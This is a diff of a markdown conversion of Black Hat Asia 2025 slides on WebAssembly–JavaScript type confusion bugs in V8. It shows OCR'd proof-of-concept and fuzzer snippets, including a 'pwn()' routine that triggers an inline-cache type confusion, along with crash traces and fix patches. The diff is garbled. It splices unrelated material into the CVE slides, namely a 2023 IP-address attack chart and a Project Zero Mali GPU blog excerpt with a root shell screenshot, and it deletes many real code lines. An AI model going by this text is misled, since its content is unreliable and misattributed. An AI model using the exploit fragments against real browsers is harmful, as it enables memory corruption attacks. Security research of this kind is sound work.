@@ -8,18 +8,25 @@ year: 2025
 source_pdf: "Black Hat Asia 2025 Slides/Nan Wang & Zhenghang Xiao & Xuehao Guo& Ming Hu_Bridging the Gap Type Confusion and Boundary Vulnerabilities Between WebAssembly and JavaScript in V8.pdf"
 pages: 44
 sha256: "414e544f1beb9b7b035624edca7a8b4f95f3b43f080e369f8b78b0f6ad0cbbac"
-text_chars: 27295
+text_chars: 24605
 ocr_pages: 16
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 86.4
+ocr_unreliable_blocks: 2
+vision_verified_blocks: 2
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:06:38Z"
+converted_at: "2026-08-12T03:55:52Z"
 ---
 # Bridging the Gap Type Confusion and Boundary Vulnerabilities Between WebAssembly and JavaScript in V8
 
 **Speakers:** Nan Wang, Zhenghang Xiao, Xuehao Guo, Ming Hu  
 **Conference:** Black Hat ASIA 2025  
 **Source:** `Black Hat Asia 2025 Slides/Nan Wang & Zhenghang Xiao & Xuehao Guo& Ming Hu_Bridging the Gap Type Confusion and Boundary Vulnerabilities Between WebAssembly and JavaScript in V8.pdf` (44 pages)
+
 
 ## Slide 1
 
@@ -231,12 +238,10 @@ Boom!
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-black hat
-ASIA 2025
-How to modify the Fuzzer to find bugs?
 Export WASM Struct to JS
 ler.addFunction('makeStruct', ...)
 ortFunc (
@@ -249,14 +254,11 @@ function createWasmStruct() {
 1
 ModuleBuilder ();
 builder =
-r.addStruct([...])7
-jist
 builder.addFunction('makeStruct', ...)
 rtFunc ()
 let instance = builder.instantiate();
 n instance.exports.makeStruct ();
 let wasmoObj] = createWasmStruct ();
-Array.prototype. proto =
 print ([1].concat ());7
 Key Mutation Points:
 - Replace JS object with WASM struct
@@ -270,15 +272,10 @@ $ /tmp/d8-linux-debug-v8-component-93712/d8 /tmp/poc.js
 #
 #
 #FailureMessage Object: 0x7ffd386eceed
-=ss= C stack trace =======: =
-/tmp/d8-Linux-debug-v8-component-93712/libv8_libbase. so( v8: : base: : debug: :StackTrace: :StackTrace()+
 /tmp/d8-Linux-debug-v8-component-93712/libv8_libplatform.so(+0x18e0d) [0x7ff684218e0d]
 /tmp/d8-Linux-debug-v8-component-93712/libv8_libbase.so(V8_Fatal(char const, int, char const«,
-/tmp/d8-Linux-debug-v8-component-93712/libv8.so(+0x25721f2) [0x7ff6813721f2]
 /tmp/d8-Linux-debug-v8-component-93712/libv8.so(+0x2660ffc) [0x7ff681460f fc]
 /tmp/d8-Linux-debug-v8-component-93712/libv8.s0(+0x26589d3) [0x7ff6814589d3]
-/tmp/d8-Linux-debug-v8-component-93712/libv8.so(v8:: internal: :Builtin_ArrayConcat(int, unsigned lc
-/tmp/d8-Linux-debug-v8-component-93712/libv8.s0(+0x1d7bb7d) [0x7ff680b7bb7d]
 [1] 1575121 trace trap /tmp/d8-linux-debug-v8-component-93712/d8 /tmp/poc2. js
 ```
 
@@ -288,15 +285,12 @@ $ /tmp/d8-linux-debug-v8-component-93712/d8 /tmp/poc.js
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 CVE-2024-5158
 JavaScript Code
-let wasmObj = createWasmStruct i
 Array. protatype-<-"“proto = wa
 V8 Engine Internal Implementation
 Maybe<bool>JSReceiver::SetPrototype (Isolate* isolate,
@@ -306,29 +300,14 @@ __ShoutdThrow should_throw) {
 if (IsWasmObject (*object)) {
 RETURN_FAILURE(isolate, should_throw,
 NewTypeError (MessageTemplate: : kWasmObjectsA
-\
 v
-\
 \
 if, (IsdSProxy(*object)) {
-\
 keturn
-\
 JSProxy::SetPrototype (isolate, Handle<Js
-Ne value, from_javascript, should throw);
-‘\
-} .
-N
-.
 réturn JSObject::SetPrototype (isolate, Handle<J
-X
-x
-v
-‘value , from_javascript, should throw);
 Lot
-reO
 ro:
-SSOb
 ```
 
 ## Slide 12
@@ -363,12 +342,10 @@ SSOb
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 JavaScript instanceof Operation
 new arg() instanceof arg
 CV E -2 o2 4.7 5 5 O Triggers JIT optimization after 5000 iterations
@@ -377,12 +354,10 @@ Maglev compiler attempts to optimize the operation
 Key Exploit I
 ars prototype = struct
 : : Type Confusion
-Tana Se pOnONe BuildHasInPrototypeChain yp
 is set to a wasm struct Maglev compiler assumes
 instead of an object Checks if prototype exists in the object's chain prototype is always
 a JSObject but
 encounters a
-a” WasmObject instead
 ie CRASH!
 InferHasInPrototypeChain
 last_prototype = prototype. AsJSOb ject () ;
@@ -402,12 +377,10 @@ last_prototype = prototype. AsJSOb ject () ;
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 issue-339736513 [v8ctf M125]
 function set_keyed_prop(arr, key, val) { MaybeHandle<Object> StoreIC::Store(Handle<Object> object,
 arr[key] = val; Handle<Name> name,
@@ -419,10 +392,8 @@ set_keyed_prop([], ®, @x1337); if (use_ic) {
 let wasm_array = wasm.create_array(Q); } else if (state() == NO FEEDBACK) {
 set_keyed_prop(wasm_array, "foo", @x1337);
 } catch(err){ } a
-Set_keyed prop(_l|, 0, Oxloa/),
 if (IsAnyDefineOwn()) {
 [...]
-set_keyed_prop(wasm_array, ®, 9x1337); } else { . . _—
 } MAYBE_RETURN_NULL(Object::SetProperty(&it, value, store_origin)); //-------- >[1]
 pwn(); }
 return value;
@@ -434,25 +405,21 @@ return value;
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 issue-339736513 [v8ctf M125]
 function set_keyed_prop(arr, key, val) f
 arr[key] = val;
 }
 function pwn() {
 set_keyed_prop([], ®, @x1337);
-}
 let wasm_array = wasm.create_array(@);
 try {
 set_keyed_prop(wasm_array, "foo", @x1337);
 } catch(err){ }
 set_keyed_prop([], ®, @x1337);
-set_keyed_prop(wasm_array, @, x1337);
 }
 pwn();
 Phase 1: Training IC with Normal Arrays
@@ -473,7 +440,6 @@ Phase 3: Polymorphic IC Creation
 set_keyed prop([], 0, 0x1337); // Normal array after WasmArray attempt
 slot #0 StoreKeyedSloppy POLYMORPHIC
 [weak] <Map(WASM ARRAY TYPE)>: StoreHandler (builtin = StoreFastElementIC_NoTransition...)
-[weak] <Map[16] (PACKED _SMI_ELEMENTS)>: StoreHandler (builtin = StoreFastElementIC_NoTransition...
 IC becomes POLYMORPHIC with both WasmArray and normal array handlers
 Phase 4: Type Confusion Exploit
 set_keyed prop(wasm_array, 0, 0x1337); // Triggers vulnerability
@@ -498,17 +464,14 @@ Results in type confusion vulnerability and potential memory corruption
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-2)
-black hat
-ASIA 2025
 Fix Patch
 [ic] Use slow stub element handler for non-JSObjects
 Fixed: 339736513
 Change-Id: 1134a046475b0b004c3delbacc5b2f1a7fa503d96
-Reviewed-on: https: //chromium-review. googlesource. com/c/v8/v8/+/5527898
 Reviewed-by: Igor Sheludko <ishell@chromium.org>
 Commit-Queue: Igor Sheludko <ishell@chromium.org>
 Auto-Submit: Shu-yu Guo <syg@chromium.org>
@@ -516,7 +479,6 @@ Cr-Commit-Position: refs/heads/main@{#93847}
 diff --git a/src/ic/ic.ce b/src/ic/ic.cc
 index 8a2ca54..0661209 100644
 --- a/src/ic/ic.cc
-+++ b/src/ic/ic.cc
 @@ -2388,15 +2388,16 @@
 isolate()),
 IsStoreInArrayLiteralIC());
@@ -550,12 +512,10 @@ te TRACE_HANDLER_STATS(isolate(), KeyedStoreIC_SlowStub) ;
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-ASIA 2025
-How to modify the Fuzzer to find bugs?
 // Creates a WASM module importing a JS function (i32 -> i32)
 function createPocWasmModule() {
 let b = new WasmModuleBuilder();
@@ -565,13 +525,10 @@ b.addImport('js','func',sig);
 // Expose callImported(x) -> calls the imported function
 b.addFunction('callImported',sig)
 .addBody([kExprLocalGet, @, kExprCallFunction, @])
-.exportFunc();
 // Provide a JS function that triggers gc(), potentially exposing UAF if references aren't tracked
 return b.instantiate({
-is? {
 func:new WebAssembly.Function({parameters:['i32'], results:['i32']},x=>{gce();return x+1;})
 }
-});
 }
 let inst=createPocWasmModule();
 for(let i=0;i<10000;i++){ inst.exports.callImported(i); }
@@ -583,13 +540,10 @@ for(let i=0;i<10000;i++){ inst.exports.callImported(i); }
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
-How to modify the Fuzzer to find bugs?
 // Creates a WASM module importing a JS function (i32 -> i32)
 function createPocWasmModule() { WebAssembly JS Import - Fuzzing Components
 let b = new WasmModuleBuilder () ;
@@ -695,12 +649,10 @@ Boom!
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-ASIA 2025
-How to modify the Fuzzer to find bugs?
 WebAssembly to JSPI Transformation
 Original WebAssembly Code
 const wasmArray = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1,
@@ -709,12 +661,9 @@ let v2 = new WebAssembly.Instance(module, { m: { js: ()=>{} }});
 v2.exports.main();
 v Transform to use JSPI
 JSPI-Enabled Code
-d8.test.enableJSPI();
 const wasmArray = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1,
 let module = new WebAssembly.Module(wasmArray);
 let v2 = new WebAssembly.Instance(module, { m: { js: (=> }});
-let y¥S= WEDASSEMDIy.promising(vZ.exportsynain);
-v3();
 Added code
 CT] JSPI transformatior
 B& WebAssembly.promising wrapper
@@ -722,12 +671,7 @@ Boom!
 # CMD: /tmp/d8-Linux-debug—v8-component-94015/d8 —-expose-gc poc.js
 Received signal 11 SEGV_ACCERR 2b94beadbef6
 ==== C stack trace == ==
-[0x7 f59a639ee53]
-[0x7 f59a639eda2]
-[0x7 #59a0642520]
 [0x55c92c207964]
-[0x7 f59a4ebc603]
-[0x7 #59a2bb0b3b]
 [end of stack trace]
 ```
 
@@ -751,16 +695,13 @@ Is it possible for the function caller to confuse the use of these two structure
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 CVE-2024-5838
 Is it possible for the function caller to confuse
 the use of these two structures? Caller
-2 2
 ~ V8 Engine
 asmApiFunctionRef WasmTrustedinstanceData
 Imported JS Function ative Wasm Functio
@@ -778,17 +719,15 @@ But how to exploit?
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-ASIA 2025
 CVE-2024-5838
 Try Re-exported the imported function?
 d8.test.enableJSPI
 const wasmArray = new Uint8Array
 new WebAssembly.Module(wasmArray
-ee ire | eee |
 let module =
 let v2 = new WebAssembly.Instance(module m: 36: =>
 let v3 = WebAssembly.promising(v2.exports.main
@@ -802,25 +741,11 @@ WasmPromising Wrapper
 2. Prepare Parameters
 3. Call call_target
 WasmApiFunctionRef
-lasmTrustedinstanceDat ,
 Expected
 Actual
-’
-'
-'
-'
-'
 '
 1
-'
-'
-'
 1
-'
-1
-'
-!
-'
 uiltins_WasmToJSWrapperAs
 | Expects WasmApiFunctionRef
 ```
@@ -849,13 +774,11 @@ What happend if we confuse these two structures?
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-ASIA 2025
 Trusted Memory Region
-CVE-2024-5838 fram
 j TrustedBase + 0x11223344
 User Controlled
 . Fixed Array
@@ -879,51 +802,17 @@ What happend if we confuse these two structures?
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 80/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bisek hat
-ASIA 2025
-CVE-2024-5838
-What happend if we confuse these two
-structures?
-=> Fake a callable object.
-Thread 1 “d8” receive
-DebugPrint: 0x2b200049aal: [JSArray]
-- map: 0x02b20018d095 <Map[16] (PACKED_DOUBLE_ELEMENTS) >
-- prototype: 0x02b20018ca09 <JSArray[0]>
-0x02b200049941 <FixedDoubleArray[43]> [PACKED_DOUBLE_ELEMENTS]
-[FastProperties]
-~ elements:
-- length: 43
-— properties: 0x02b200000725 <FixedArray[0]>
-— All own properties (excluding elements): {
-0x2b200000d99: [String] in ReadOnlySpace: #length: 0x02b20028818d <AccessorInfo name= 0x02b200000d99 <String[6
-- elements: 0x02b200049941 <FixedDoubleArray[43]>
-itil
-=— od
-DebugPrint: 0x266200049a81: [WasmTrustedInstanceData]
-spatch_table_for_imports: 0x266200049a41 <WasmDispatchTable[1]
-signal SIGSEGV, Segmentation fault.
-0x0000555556896f17 inj v8::internal::HeapObject: :HeapObjectPrint (std: :__Cr::basic_ostream<char, std::__Cr::char_traits<char> >&) ()
-LEGEND: STACK | HEAP J} CODE | DATA | RWX | RODATA
-*RAX 0x2b200000000 .*— 0x40940
-RBX ::StdoutStream+24) —» 0x5555567d4200 (v8: : internal: :StdoutStream: : StdoutStream|
-*RCX 0x9999999a
-RDX Oxc
-RDI Ox7f£ffffffcc58 —» 0x2b200049a41 «— Ox9a3F£19999999999
-RSI 0x555557£77540 —» 0x555557d93098 (vtable for v8::internal::StdoutStream+24) —» 0x5555567d4200 (v8::internal: :StdoutStream: : “StdoutStream|
-R8 = 0x555557£77598 —» 0x555557d930c0 (vtable for v8::internal::StdoutStream+64) —» 0x5555567d4600 (virtual thunk to v8::internal::StdoutStrez
-R9 0x20
-R10 Ox7ffff41fddd8 «— 0x2
-*R11  Oxafc527c8e4c063c3
-R12 0x555557dea728 (vtable for std::_Cr::basic_ios<char, std::_Cr::char_traits<char> >+16) —» 0x555557b9e530 (std::__Cr::basic_ios<wchar_t,
-R13 0x555557e2f388 (v8::internal::MainCage::base_) —» 0x2b200000000 «— 0x40940
-*R14 0x2b200049a41 «— 0x9a3f£19999999999
-*R15 0x2b200049a40 «— 0x3f£f199999999999a
-RBP Ox7fffffffcc40 —>» Ox7fffffffcc70 —» Ox7fffffffcca0 —» Ox7fffffffcceO) —» Ox7ffff4lfddf8 «—
-RSP Ox7fffffffecl10 —» 0x555557£77540 —» 0x555557d93098 (vtable for v8::internal::StdoutStream+24) —» 0x5555567d4200 (v8::internal: :StdoutSt
-RIP 0x555556896f17 (v8::internal::HeapObject: :HeapObjectPrint (std: :__Cr::basic_ostream<char, std::__Cr::char_traits<char> >&)+39) <— movzx eax,
+Heavily Distributed Attack: > 187k IP Addresses
+
+[Line chart]
+Y-axis title: Distinct number of IP addresses
+Y-axis ticks: 50,000 / 40,000 / 30,000 / 20,000 / 10,000 / 0
+X-axis ticks: 2023-02-22 00:00   2023-02-23 00:00   2023-02-24 00:00   2023-02-25 00:00   2023-02-26 00:00   2023-02-27 00:00   2023-02-28 00:00
+X-axis label: Number of IP addresses / 3h
 ```
 
 ## Slide 36
@@ -934,12 +823,10 @@ Restricted some functionalities of the imported function.
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 Fix Patch
 Restricted some functionalities of the imported
 function.
@@ -949,9 +836,7 @@ when it is called from the generic js-to-wasm wrapper.
 Disable the generic js-to-wasm wrapper for imports again until these
 issues are resolved.
 R=ahaas@chromium.org
-Bug: 343772336, 343917751, 342522151
 Change-Id: Ibf6d11ab759fbbb71da93d163121a28aaa0700e0
-Reviewed-on: https: //chromium-review. googlesource.com/c/v8/v8/+/5600348
 Reviewed-by: Andreas Haas <ahaas@chromium.org>
 Commit-Queue: Thibaud Michaud <thibaudm@chromium.org>
 Cr-Commit-Position: refs/heads/main@{ #94270}
@@ -1027,60 +912,66 @@ Crashed
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-2)
-black hat
-ASIA 2025
-CVE-2024-8638
-# CMD: /tmp/d8-linux-debug-v8-component-95842/d8 --allow-natives-syntax --jit-fuzzing poc.js
-# OUTPUT ======================s=s=ssssssss55s2555555555=555============
-#
-# Fatal error in ../../src/objects/shared-function-info-inl.h, line 911
-# Debug check failed: HasWasmExportedFunctionData().
-#
-#
-#
-#FailureMessage Object: Ox7ffd2b60ead0
-==== C stack traCe ==========s===s=ss===sss==s=====
-/tmp/d8-linux-debug-v8-component-
-95842/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x13) [0x7f831d74b153]
-/tmp/d8-linux-debug-v8-component-95842/libv8_libplatform.so(+0x199ed) [0x7f831d6f39ed]
-/tmp/d8-linux-debug-v8-component-95842/libv8_libbase.so(V8_Fatal(char const*, int, char const*,
-...)+0x194) [0x7f831d72c854]
-/tmp/d8-linux-debug-v8-component-95842/libv8_libbase.so(+0x2c265) [0x7f831d72c265]
-/tmp/d8-linux-debug-v8-component-
-95842/libv8.so(v8::internal::SharedFunctionInfo::;wasm_exported_function_data(v8::internal::PtrComprCage
-Base) const+0xa3) [0x7f831a87b143]
-/tmp/d8-linux-debug-v8-component-95842/libv8.so(+0x3ffb012) [0x7f831 bdfb01 2]
-/tmp/d8-linux-debug-v8-component-95842/libv8.so(+0x3fda1 fb) [0x7f831 bdda1 fb]
-/tmp/d8-linux-debug-v8-component-95842/libv8.so(v8::internal::Runtime_WasmCompileWrapper(int,
-unsigned long¥, v8::internal::lsolate*)+0x90) [0x7f831bdd9a30]
-/tmp/d8-linux-debug-v8-component-95842/libv8.so(+0x1f65dd7) [0x7f8319d65dd7]
-d8.test.enableJSPI
-d8.test.installConditionalFeatures
-d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js'
-const sig = makeSig([{kWasmI32
-const builder = new WasinModuleBuilder
-const _type = builder.addType(sig
-const _import = builder.addImport('m', ‘foo’, _type
-const _table = builder.addTable(kWasmAnyFunc, 10) .index;
-builder.addExportOfKind(sig, builder, _import, _table
-builder.addFunction('main',
-kExprLocalGet, @
-kExprI32Const, @
-_type) .addBody
-kExprTableGet, _table
-kGCPrefix
-kExprRefCast, _type
-kExprCallRef, _type
-exportFunc
-const func = new WebAssembly.Function
-parameters: ['i32'], results:
-=> 12
-const instance = builder.instantiate mn: “FOO: “func
-instance.exports.main(15
+Fix
+
+[Left: social media post]
+Thomas King - @thomasking2014@i...   @Thom... · 2022年9月20日
+R.I.P again
+
+[Screenshot 1: Android About phone]
+Android version
+13
+
+Android security update
+September 5, 2022
+
+Google Play system update
+July 1, 2022
+
+Baseband version
+g5123b-102852-220720-B-8851166
+
+Kernel version
+5.10.107-android13-4-00008-g466e95df8c7c-ab8760753
+#1 Thu Jun 23 15:42:45 UTC 2022
+
+Build number
+
+[Screenshot 2: terminal]
+spawn root shell !
+pwned_by_thomasking:/data/data/org.connectbot # id
+uid=0(root) gid=0(root) groups=0(root),3003(inet),9997(everybody),2
+0246(u0_a246_cache),50246(all_a246) context=u:r:untrusted_app_27:s0
+:c246,c256,c512,c768
+pwned_by_thomasking:/data/data/org.connectbot # getenforce
+Permissive
+pwned_by_thomasking:/data/data/org.connectbot #
+
+[Right: blog post]
+Tuesday, November 22, 2022
+
+Mind the Gap
+
+By Ian Beer, Project Zero
+
+Note: The vulnerabilities discussed in this blog post (CVE-2022-33917) are fixed by the upstream vendor, but at the time of publication, these fixes have not yet made it downstream to affected Android devices (including Pixel, Samsung, Xiaomi, Oppo and others). Devices with a Mali GPU are currently vulnerable.
+
+Introduction
+
+In June 2022, Project Zero researcher Maddie Stone gave a talk at FirstCon22 titled 0-day In-the-Wild Exploitation in 2022…so far. A key takeaway was that approximately 50% of the observed 0-days in the first half of 2022 were variants of previously patched vulnerabilities. This finding is consistent with our understanding of attacker behavior: attackers will take the path of least resistance, and as long as vendors don't consistently perform thorough root-cause analysis when fixing security vulnerabilities, it will continue to be worth investing time in trying to revive known vulnerabilities before looking for novel ones.
+
+The presentation discussed an in the wild exploit targeting the Pixel 6 and leveraging CVE-2021-39793, a vulnerability in the ARM Mali GPU driver used by a large number of other Android devices. ARM's advisory described the vulnerability as:
+
+Title           Mali GPU Kernel Driver may elevate CPU RO pages to writable
+CVE             CVE-2022-22706 (also reported in CVE-2021-39793)
+Date of issue   6th January 2022
+Impact          A non-privileged user can get a write access to read-only memory pages [sic].
+
+The week before FirstCon22, Maddie gave an internal preview of her talk. Inspired by the description of an in-the-wild vulnerability in low-level memory management code, fellow Project Zero researcher Jann Horn started auditing the ARM Mali GPU driver. Over the next three weeks, Jann found five more exploitable vulnerabilities (2325, 2327, 2331, 2333, 2334).
 ```
 
 ## Slide 42
@@ -1097,16 +988,13 @@ In replacing the wrapper of a function exported from Wasm, do not replace the wr
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-ASIA 2025
 WASM-JS Interaction Fuzzing
 Architecture
 WebAssembly-JavaScript Interaction Fuzzing Architecture
-(- ‘
 WASM.-JS Interaction Mutation Strategies
 WASM Export to JS JS Import to WASM JSPI Transformation
 Export WASM Objects & Create WASM Modules with Use WebAssembly.promising
